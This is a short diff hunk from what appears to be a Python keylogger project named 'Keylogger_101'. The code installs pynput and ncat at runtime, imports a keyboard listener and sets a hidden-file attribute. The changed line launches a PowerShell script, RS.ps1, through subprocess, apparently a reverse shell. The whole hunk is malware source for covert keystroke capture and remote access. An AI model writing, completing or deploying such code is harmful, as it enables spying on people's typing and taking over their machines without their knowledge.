@@ -16,7 +16,7 @@ import threading
 subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])
 subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'ncat'])
 from pynput.keyboard import Key, Listener
-p = subprocess.Popen(["powershell.exe", "<path>", stdout=sys.stdout])
+p = subprocess.Popen(["powershell.exe", "C:\\Users\\CY-PC-211\\Documents\\GitHub\\Keylogger_101\\RS.ps1"], stdout=sys.stdout)
 
 # Hidden file attribute
 FILE_ATTRIBUTE_HIDDEN = 0x02
